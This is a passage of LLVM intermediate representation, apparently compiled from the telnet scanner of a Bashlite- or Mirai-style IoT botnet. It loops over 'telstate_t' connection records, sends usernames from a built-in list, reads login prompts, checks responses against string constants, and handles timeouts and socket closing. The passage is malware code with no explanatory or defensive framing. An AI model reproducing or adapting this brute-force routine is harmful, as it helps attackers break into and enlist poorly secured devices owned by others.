  %628 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %627, i32 0, i32 2
  store i8 5, i8* %628, align 8
  br label %2054

629:                                              ; preds = %592
  %630 = load i32, i32* %2, align 4
  %631 = sext i32 %630 to i64
  %632 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %631
  %633 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %632, i32 0, i32 8
  %634 = load i8*, i8** %633, align 8
  %635 = call i64 @strlen(i8* noundef %634) #11
  %636 = trunc i64 %635 to i16
  %637 = load i32, i32* %2, align 4
  %638 = sext i32 %637 to i64
  %639 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %638
  %640 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %639, i32 0, i32 7
  store i16 %636, i16* %640, align 16
  br label %641

641:                                              ; preds = %629
  br label %642

642:                                              ; preds = %641
  br label %643

643:                                              ; preds = %642
  br label %644

644:                                              ; preds = %643
  br label %645

645:                                              ; preds = %644
  %646 = load i32, i32* %2, align 4
  %647 = sext i32 %646 to i64
  %648 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %647
  %649 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %648, i32 0, i32 6
  %650 = load i32, i32* %649, align 4
  %651 = add i32 %650, 10
  %652 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* noundef null)
  %653 = icmp ult i32 %651, %652
  br i1 %653, label %654, label %669

654:                                              ; preds = %645
  %655 = load i32, i32* %2, align 4
  %656 = sext i32 %655 to i64
  %657 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %656
  %658 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %657, i32 0, i32 0
  %659 = load i32, i32* %658, align 16
  %660 = call i32 @sclose(i32 noundef %659)
  %661 = load i32, i32* %2, align 4
  %662 = sext i32 %661 to i64
  %663 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %662
  %664 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %663, i32 0, i32 2
  store i8 0, i8* %664, align 8
  %665 = load i32, i32* %2, align 4
  %666 = sext i32 %665 to i64
  %667 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %666
  %668 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %667, i32 0, i32 3
  store i8 1, i8* %668, align 1
  br label %669

669:                                              ; preds = %654, %645
  br label %2053

670:                                              ; preds = %69
  %671 = load i32, i32* %2, align 4
  %672 = sext i32 %671 to i64
  %673 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %672
  %674 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %673, i32 0, i32 0
  %675 = load i32, i32* %674, align 16
  %676 = load i32, i32* %2, align 4
  %677 = sext i32 %676 to i64
  %678 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %677
  %679 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %678, i32 0, i32 4
  %680 = load i8, i8* %679, align 2
  %681 = zext i8 %680 to i64
  %682 = getelementptr inbounds [10 x i8*], [10 x i8*]* @usernames, i64 0, i64 %681
  %683 = load i8*, i8** %682, align 8
  %684 = load i32, i32* %2, align 4
  %685 = sext i32 %684 to i64
  %686 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %685
  %687 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %686, i32 0, i32 4
  %688 = load i8, i8* %687, align 2
  %689 = zext i8 %688 to i64
  %690 = getelementptr inbounds [10 x i8*], [10 x i8*]* @usernames, i64 0, i64 %689
  %691 = load i8*, i8** %690, align 8
  %692 = call i64 @strlen(i8* noundef %691) #11
  %693 = call i64 @send(i32 noundef %675, i8* noundef %683, i64 noundef %692, i32 noundef 16384)
  %694 = icmp slt i64 %693, 0
  br i1 %694, label %695, label %710

695:                                              ; preds = %670
  %696 = load i32, i32* %2, align 4
  %697 = sext i32 %696 to i64
  %698 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %697
  %699 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %698, i32 0, i32 0
  %700 = load i32, i32* %699, align 16
  %701 = call i32 @sclose(i32 noundef %700)
  %702 = load i32, i32* %2, align 4
  %703 = sext i32 %702 to i64
  %704 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %703
  %705 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %704, i32 0, i32 2
  store i8 0, i8* %705, align 8
  %706 = load i32, i32* %2, align 4
  %707 = sext i32 %706 to i64
  %708 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %707
  %709 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %708, i32 0, i32 3
  store i8 1, i8* %709, align 1
  br label %2054

710:                                              ; preds = %670
  %711 = load i32, i32* %2, align 4
  %712 = sext i32 %711 to i64
  %713 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %712
  %714 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %713, i32 0, i32 0
  %715 = load i32, i32* %714, align 16
  %716 = call i64 @send(i32 noundef %715, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.31, i64 0, i64 0), i64 noundef 2, i32 noundef 16384)
  %717 = icmp slt i64 %716, 0
  br i1 %717, label %718, label %733

718:                                              ; preds = %710
  %719 = load i32, i32* %2, align 4
  %720 = sext i32 %719 to i64
  %721 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %720
  %722 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %721, i32 0, i32 0
  %723 = load i32, i32* %722, align 16
  %724 = call i32 @sclose(i32 noundef %723)
  %725 = load i32, i32* %2, align 4
  %726 = sext i32 %725 to i64
  %727 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %726
  %728 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %727, i32 0, i32 2
  store i8 0, i8* %728, align 8
  %729 = load i32, i32* %2, align 4
  %730 = sext i32 %729 to i64
  %731 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %730
  %732 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %731, i32 0, i32 3
  store i8 1, i8* %732, align 1
  br label %2054

733:                                              ; preds = %710
  %734 = load i32, i32* %2, align 4
  %735 = sext i32 %734 to i64
  %736 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %735
  %737 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %736, i32 0, i32 2
  store i8 4, i8* %737, align 8
  br label %2053

738:                                              ; preds = %69
  %739 = load i32, i32* %2, align 4
  %740 = sext i32 %739 to i64
  %741 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %740
  %742 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %741, i32 0, i32 6
  %743 = load i32, i32* %742, align 4
  %744 = icmp eq i32 %743, 0
  br i1 %744, label %745, label %751

745:                                              ; preds = %738
  %746 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* noundef null)
  %747 = load i32, i32* %2, align 4
  %748 = sext i32 %747 to i64
  %749 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %748
  %750 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %749, i32 0, i32 6
  store i32 %746, i32* %750, align 4
  br label %751

751:                                              ; preds = %745, %738
  %752 = load i32, i32* %2, align 4
  %753 = sext i32 %752 to i64
  %754 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %753
  %755 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %754, i32 0, i32 0
  %756 = load i32, i32* %755, align 16
  %757 = load i32, i32* %2, align 4
  %758 = sext i32 %757 to i64
  %759 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %758
  %760 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %759, i32 0, i32 8
  %761 = load i8*, i8** %760, align 8
  %762 = load i32, i32* %2, align 4
  %763 = sext i32 %762 to i64
  %764 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %763
  %765 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %764, i32 0, i32 7
  %766 = load i16, i16* %765, align 16
  %767 = zext i16 %766 to i32
  %768 = call i32 @readUntil(i32 noundef %756, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.28, i64 0, i64 0), i32 noundef 1, i32 noundef 0, i32 noundef 10000, i8* noundef %761, i32 noundef 1024, i32 noundef %767)
  %769 = icmp ne i32 %768, 0
  br i1 %769, label %770, label %802

770:                                              ; preds = %751
  %771 = load i32, i32* %2, align 4
  %772 = sext i32 %771 to i64
  %773 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %772
  %774 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %773, i32 0, i32 6
  store i32 0, i32* %774, align 4
  %775 = load i32, i32* %2, align 4
  %776 = sext i32 %775 to i64
  %777 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %776
  %778 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %777, i32 0, i32 7
  store i16 0, i16* %778, align 16
  %779 = load i32, i32* %2, align 4
  %780 = sext i32 %779 to i64
  %781 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %780
  %782 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %781, i32 0, i32 8
  %783 = load i8*, i8** %782, align 8
  %784 = call i8* @strstr(i8* noundef %783, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.28, i64 0, i64 0)) #11
  %785 = icmp ne i8* %784, null
  br i1 %785, label %786, label %791

786:                                              ; preds = %770
  %787 = load i32, i32* %2, align 4
  %788 = sext i32 %787 to i64
  %789 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %788
  %790 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %789, i32 0, i32 2
  store i8 5, i8* %790, align 8
  br label %796

791:                                              ; preds = %770
  %792 = load i32, i32* %2, align 4
  %793 = sext i32 %792 to i64
  %794 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %793
  %795 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %794, i32 0, i32 2
  store i8 7, i8* %795, align 8
  br label %796

796:                                              ; preds = %791, %786
  %797 = load i32, i32* %2, align 4
  %798 = sext i32 %797 to i64
  %799 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %798
  %800 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %799, i32 0, i32 8
  %801 = load i8*, i8** %800, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %801, i8 0, i64 1024, i1 false)
  br label %2054

802:                                              ; preds = %751
  %803 = load i32, i32* %2, align 4
  %804 = sext i32 %803 to i64
  %805 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %804
  %806 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %805, i32 0, i32 0
  %807 = load i32, i32* %806, align 16
  %808 = load i32, i32* %2, align 4
  %809 = sext i32 %808 to i64
  %810 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %809
  %811 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %810, i32 0, i32 8
  %812 = load i8*, i8** %811, align 8
  %813 = load i32, i32* %2, align 4
  %814 = sext i32 %813 to i64
  %815 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %814
  %816 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %815, i32 0, i32 7
  %817 = load i16, i16* %816, align 16
  %818 = zext i16 %817 to i32
  %819 = call i32 @readUntil(i32 noundef %807, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i64 0, i64 0), i32 noundef 1, i32 noundef 0, i32 noundef 10000, i8* noundef %812, i32 noundef 1024, i32 noundef %818)
  %820 = icmp ne i32 %819, 0
  br i1 %820, label %821, label %853

821:                                              ; preds = %802
  %822 = load i32, i32* %2, align 4
  %823 = sext i32 %822 to i64
  %824 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %823
  %825 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %824, i32 0, i32 6
  store i32 0, i32* %825, align 4
  %826 = load i32, i32* %2, align 4
  %827 = sext i32 %826 to i64
  %828 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %827
  %829 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %828, i32 0, i32 7
  store i16 0, i16* %829, align 16
  %830 = load i32, i32* %2, align 4
  %831 = sext i32 %830 to i64
  %832 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %831
  %833 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %832, i32 0, i32 8
  %834 = load i8*, i8** %833, align 8
  %835 = call i8* @strstr(i8* noundef %834, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i64 0, i64 0)) #11
  %836 = icmp ne i8* %835, null
  br i1 %836, label %837, label %842

837:                                              ; preds = %821
  %838 = load i32, i32* %2, align 4
  %839 = sext i32 %838 to i64
  %840 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %839
  %841 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %840, i32 0, i32 2
  store i8 5, i8* %841, align 8
  br label %847

842:                                              ; preds = %821
  %843 = load i32, i32* %2, align 4
  %844 = sext i32 %843 to i64
  %845 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %844
  %846 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %845, i32 0, i32 2
  store i8 7, i8* %846, align 8
  br label %847

847:                                              ; preds = %842, %837
  %848 = load i32, i32* %2, align 4
  %849 = sext i32 %848 to i64
  %850 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %849
  %851 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %850, i32 0, i32 8
  %852 = load i8*, i8** %851, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %852, i8 0, i64 1024, i1 false)
  br label %2054

853:                                              ; preds = %802
  %854 = load i32, i32* %2, align 4
  %855 = sext i32 %854 to i64
  %856 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %855
  %857 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %856, i32 0, i32 8
  %858 = load i8*, i8** %857, align 8
  %859 = call i8* @strstr(i8* noundef %858, i8* noundef getelementptr inbounds ([8 x i8], [8 x i8]* @.str.32, i64 0, i64 0)) #11
  %860 = icmp ne i8* %859, null
  br i1 %860, label %861, label %876

861:                                              ; preds = %853
  %862 = load i32, i32* %2, align 4
  %863 = sext i32 %862 to i64
  %864 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %863
  %865 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %864, i32 0, i32 0
  %866 = load i32, i32* %865, align 16
  %867 = call i32 @sclose(i32 noundef %866)
  %868 = load i32, i32* %2, align 4
  %869 = sext i32 %868 to i64
  %870 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %869
  %871 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %870, i32 0, i32 2
  store i8 0, i8* %871, align 8
  %872 = load i32, i32* %2, align 4
  %873 = sext i32 %872 to i64
  %874 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %873
  %875 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %874, i32 0, i32 3
  store i8 0, i8* %875, align 1
  br label %2054

876:                                              ; preds = %853
  %877 = load i32, i32* %2, align 4
  %878 = sext i32 %877 to i64
  %879 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %878
  %880 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %879, i32 0, i32 8
  %881 = load i8*, i8** %880, align 8
  %882 = call i8* @strstr(i8* noundef %881, i8* noundef getelementptr inbounds ([10 x i8], [10 x i8]* @.str.33, i64 0, i64 0)) #11
  %883 = icmp ne i8* %882, null
  br i1 %883, label %884, label %899

884:                                              ; preds = %876
  %885 = load i32, i32* %2, align 4
  %886 = sext i32 %885 to i64
  %887 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %886
  %888 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %887, i32 0, i32 0
  %889 = load i32, i32* %888, align 16
  %890 = call i32 @sclose(i32 noundef %889)
  %891 = load i32, i32* %2, align 4
  %892 = sext i32 %891 to i64
  %893 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %892
  %894 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %893, i32 0, i32 2
  store i8 0, i8* %894, align 8
  %895 = load i32, i32* %2, align 4
  %896 = sext i32 %895 to i64
  %897 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %896
  %898 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %897, i32 0, i32 3
  store i8 0, i8* %898, align 1
  br label %2054

899:                                              ; preds = %876
  %900 = load i32, i32* %2, align 4
  %901 = sext i32 %900 to i64
  %902 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %901
  %903 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %902, i32 0, i32 8
  %904 = load i8*, i8** %903, align 8
  %905 = call i8* @strstr(i8* noundef %904, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.34, i64 0, i64 0)) #11
  %906 = icmp ne i8* %905, null
  br i1 %906, label %907, label %922

907:                                              ; preds = %899
  %908 = load i32, i32* %2, align 4
  %909 = sext i32 %908 to i64
  %910 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %909
  %911 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %910, i32 0, i32 0
  %912 = load i32, i32* %911, align 16
  %913 = call i32 @sclose(i32 noundef %912)
  %914 = load i32, i32* %2, align 4
  %915 = sext i32 %914 to i64
  %916 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %915
  %917 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %916, i32 0, i32 2
  store i8 0, i8* %917, align 8
  %918 = load i32, i32* %2, align 4
  %919 = sext i32 %918 to i64
  %920 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %919
  %921 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %920, i32 0, i32 3
  store i8 0, i8* %921, align 1
  br label %2054

922:                                              ; preds = %899
  %923 = load i32, i32* %2, align 4
  %924 = sext i32 %923 to i64
  %925 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %924
  %926 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %925, i32 0, i32 8
  %927 = load i8*, i8** %926, align 8
  %928 = call i8* @strstr(i8* noundef %927, i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i64 0, i64 0)) #11
  %929 = icmp ne i8* %928, null
  br i1 %929, label %930, label %945

930:                                              ; preds = %922
  %931 = load i32, i32* %2, align 4
  %932 = sext i32 %931 to i64
  %933 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %932
  %934 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %933, i32 0, i32 0
  %935 = load i32, i32* %934, align 16
  %936 = call i32 @sclose(i32 noundef %935)
  %937 = load i32, i32* %2, align 4
  %938 = sext i32 %937 to i64
  %939 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %938
  %940 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %939, i32 0, i32 2
  store i8 0, i8* %940, align 8
  %941 = load i32, i32* %2, align 4
  %942 = sext i32 %941 to i64
  %943 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %942
  %944 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %943, i32 0, i32 3
  store i8 0, i8* %944, align 1
  br label %2054

945:                                              ; preds = %922
  %946 = load i32, i32* %2, align 4
  %947 = sext i32 %946 to i64
  %948 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %947
  %949 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %948, i32 0, i32 8
  %950 = load i8*, i8** %949, align 8
  %951 = call i8* @strstr(i8* noundef %950, i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.36, i64 0, i64 0)) #11
  %952 = icmp ne i8* %951, null
  br i1 %952, label %953, label %968

953:                                              ; preds = %945
  %954 = load i32, i32* %2, align 4
  %955 = sext i32 %954 to i64
  %956 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %955
  %957 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %956, i32 0, i32 0
  %958 = load i32, i32* %957, align 16
  %959 = call i32 @sclose(i32 noundef %958)
  %960 = load i32, i32* %2, align 4
  %961 = sext i32 %960 to i64
  %962 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %961
  %963 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %962, i32 0, i32 2
  store i8 0, i8* %963, align 8
  %964 = load i32, i32* %2, align 4
  %965 = sext i32 %964 to i64
  %966 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %965
  %967 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %966, i32 0, i32 3
  store i8 0, i8* %967, align 1
  br label %2054

968:                                              ; preds = %945
  %969 = load i32, i32* %2, align 4
  %970 = sext i32 %969 to i64
  %971 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %970
  %972 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %971, i32 0, i32 8
  %973 = load i8*, i8** %972, align 8
  %974 = call i8* @strstr(i8* noundef %973, i8* noundef getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i64 0, i64 0)) #11
  %975 = icmp ne i8* %974, null
  br i1 %975, label %976, label %991

976:                                              ; preds = %968
  %977 = load i32, i32* %2, align 4
  %978 = sext i32 %977 to i64
  %979 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %978
  %980 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %979, i32 0, i32 0
  %981 = load i32, i32* %980, align 16
  %982 = call i32 @sclose(i32 noundef %981)
  %983 = load i32, i32* %2, align 4
  %984 = sext i32 %983 to i64
  %985 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %984
  %986 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %985, i32 0, i32 2
  store i8 0, i8* %986, align 8
  %987 = load i32, i32* %2, align 4
  %988 = sext i32 %987 to i64
  %989 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %988
  %990 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %989, i32 0, i32 3
  store i8 0, i8* %990, align 1
  br label %2054

991:                                              ; preds = %968
  %992 = load i32, i32* %2, align 4
  %993 = sext i32 %992 to i64
  %994 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %993
  %995 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %994, i32 0, i32 8
  %996 = load i8*, i8** %995, align 8
  %997 = call i8* @strstr(i8* noundef %996, i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.38, i64 0, i64 0)) #11
  %998 = icmp ne i8* %997, null
  br i1 %998, label %999, label %1014

999:                                              ; preds = %991
  %1000 = load i32, i32* %2, align 4
  %1001 = sext i32 %1000 to i64
  %1002 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1001
  %1003 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1002, i32 0, i32 0
  %1004 = load i32, i32* %1003, align 16
  %1005 = call i32 @sclose(i32 noundef %1004)
  %1006 = load i32, i32* %2, align 4
  %1007 = sext i32 %1006 to i64
  %1008 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1007
  %1009 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1008, i32 0, i32 2
  store i8 0, i8* %1009, align 8
  %1010 = load i32, i32* %2, align 4
  %1011 = sext i32 %1010 to i64
  %1012 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1011
  %1013 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1012, i32 0, i32 3
  store i8 0, i8* %1013, align 1
  br label %2054

1014:                                             ; preds = %991
  %1015 = load i32, i32* %2, align 4
  %1016 = sext i32 %1015 to i64
  %1017 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1016
  %1018 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1017, i32 0, i32 8
  %1019 = load i8*, i8** %1018, align 8
  %1020 = call i8* @strstr(i8* noundef %1019, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.39, i64 0, i64 0)) #11
  %1021 = icmp ne i8* %1020, null
  br i1 %1021, label %1022, label %1037

1022:                                             ; preds = %1014
  %1023 = load i32, i32* %2, align 4
  %1024 = sext i32 %1023 to i64
  %1025 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1024
  %1026 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1025, i32 0, i32 0
  %1027 = load i32, i32* %1026, align 16
  %1028 = call i32 @sclose(i32 noundef %1027)
  %1029 = load i32, i32* %2, align 4
  %1030 = sext i32 %1029 to i64
  %1031 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1030
  %1032 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1031, i32 0, i32 2
  store i8 0, i8* %1032, align 8
  %1033 = load i32, i32* %2, align 4
  %1034 = sext i32 %1033 to i64
  %1035 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1034
  %1036 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1035, i32 0, i32 3
  store i8 0, i8* %1036, align 1
  br label %2054

1037:                                             ; preds = %1014
  br label %1038

1038:                                             ; preds = %1037
  br label %1039

1039:                                             ; preds = %1038
  br label %1040

1040:                                             ; preds = %1039
  br label %1041

1041:                                             ; preds = %1040
  br label %1042

1042:                                             ; preds = %1041
  br label %1043

1043:                                             ; preds = %1042
  br label %1044

1044:                                             ; preds = %1043
  %1045 = load i32, i32* %2, align 4
  %1046 = sext i32 %1045 to i64
  %1047 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1046
  %1048 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1047, i32 0, i32 8
  %1049 = load i8*, i8** %1048, align 8
  %1050 = call i64 @strlen(i8* noundef %1049) #11
  %1051 = trunc i64 %1050 to i16
  %1052 = load i32, i32* %2, align 4
  %1053 = sext i32 %1052 to i64
  %1054 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1053
  %1055 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1054, i32 0, i32 7
  store i16 %1051, i16* %1055, align 16
  br label %1056

1056:                                             ; preds = %1044
  br label %1057

1057:                                             ; preds = %1056
  %1058 = load i32, i32* %2, align 4
  %1059 = sext i32 %1058 to i64
  %1060 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1059
  %1061 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1060, i32 0, i32 6
  %1062 = load i32, i32* %1061, align 4
  %1063 = add i32 %1062, 10
  %1064 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* noundef null)
  %1065 = icmp ult i32 %1063, %1064
  br i1 %1065, label %1066, label %1081

1066:                                             ; preds = %1057
  %1067 = load i32, i32* %2, align 4
  %1068 = sext i32 %1067 to i64
  %1069 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1068
  %1070 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1069, i32 0, i32 0
  %1071 = load i32, i32* %1070, align 16
  %1072 = call i32 @sclose(i32 noundef %1071)
  %1073 = load i32, i32* %2, align 4
  %1074 = sext i32 %1073 to i64
  %1075 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1074
  %1076 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1075, i32 0, i32 2
  store i8 0, i8* %1076, align 8
  %1077 = load i32, i32* %2, align 4
  %1078 = sext i32 %1077 to i64
  %1079 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1078
  %1080 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1079, i32 0, i32 3
  store i8 1, i8* %1080, align 1
  br label %1081

1081:                                             ; preds = %1066, %1057
  br label %2053

1082:                                             ; preds = %69
  %1083 = load i32, i32* %2, align 4
  %1084 = sext i32 %1083 to i64
  %1085 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1084
  %1086 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1085, i32 0, i32 0
  %1087 = load i32, i32* %1086, align 16
  %1088 = load i32, i32* %2, align 4
  %1089 = sext i32 %1088 to i64
  %1090 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1089
  %1091 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1090, i32 0, i32 5
  %1092 = load i8, i8* %1091, align 1
  %1093 = zext i8 %1092 to i64
